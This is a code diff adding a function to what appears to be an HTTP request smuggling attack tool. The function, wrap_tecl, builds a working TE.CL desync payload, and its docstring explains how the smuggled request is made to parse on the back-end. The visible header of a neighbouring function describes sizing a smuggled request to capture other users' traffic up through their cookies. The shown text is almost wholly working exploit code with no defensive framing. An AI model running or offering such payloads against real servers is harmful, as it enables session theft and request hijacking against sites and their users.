@@ -47,6 +47,39 @@ def wrap_clte(host: str, smuggled_request: str, path: str = "/") -> str:
     )
 
 
+def wrap_tecl(host: str, smuggled_request: str, path: str = "/") -> str:
+    """Wrap a smuggled HTTP/1.1 request in a TE.CL outer request.
+
+    Mirror of wrap_clte for the opposite desync: a front-end that honours
+    Transfer-Encoding against a back-end that honours Content-Length. The body
+    is a single chunk holding the smuggled request, terminated by a 0-chunk. The
+    front-end (TE) reads the whole chunk and forwards it; the back-end (CL)
+    consumes only the chunk-size line as the first request's body and parses the
+    smuggled bytes as the next request. The outer Content-Length is set to the
+    byte length of that chunk-size line (hex + CRLF) so the back-end stops
+    exactly there — computed here, because a >255-byte smuggle needs a 3-hex-digit
+    size line and thus Content-Length 5, not the 4 that a hand-written 2-digit
+    template assumes.
+
+    The smuggled request must carry its OWN Content-Length large enough to absorb
+    the trailing "0" chunk (and the head of the next real request) so the back-end
+    does not error — that is the caller's payload, not this wrapper's job.
+    """
+    chunk_hex = format(len(smuggled_request.encode()), "x")
+    size_line = chunk_hex + CRLF
+    outer_cl = len(size_line.encode())
+    body = size_line + smuggled_request + CRLF + "0" + CRLF + CRLF
+    return (
+        f"POST {path} HTTP/1.1" + CRLF
+        + f"Host: {host}" + CRLF
+        + "Content-Type: application/x-www-form-urlencoded" + CRLF
+        + f"Content-Length: {outer_cl}" + CRLF
+        + "Transfer-Encoding: chunked" + CRLF
+        + CRLF
+        + body
+    )
+
+
 def capture_cl_through(sample_request: str, prefix_len: int,
                        capture_through: str = "cookie") -> dict:
     """Recommend the smuggled Content-Length so the stored capture reaches the
